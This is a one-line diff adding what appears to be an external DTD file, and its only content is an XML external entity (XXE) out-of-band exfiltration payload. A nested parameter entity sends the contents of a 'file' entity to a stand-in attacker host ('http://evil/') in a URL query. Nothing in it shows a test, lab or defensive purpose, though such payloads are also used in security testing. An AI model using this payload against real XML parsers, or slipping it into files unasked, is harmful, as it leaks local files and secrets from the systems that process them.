@@ -1,0 +1,1 @@
+<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://evil/?%file;'>"> %all;
